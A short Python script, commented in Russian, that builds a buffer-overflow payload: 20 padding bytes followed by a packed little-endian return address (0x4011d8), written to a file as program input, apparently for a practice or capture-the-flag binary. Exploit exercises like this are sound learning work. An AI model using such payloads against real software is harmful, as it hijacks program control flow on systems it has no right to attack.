import struct

little_endian_address = struct.pack("<Q", 0x00000000004011d8)

# Записываем 20 байт мусора, и адрес нужной нам инструкции
input_string = b"A" * 20 + little_endian_address 

with open("input_string.txt", "wb") as f:
    f.write(input_string)
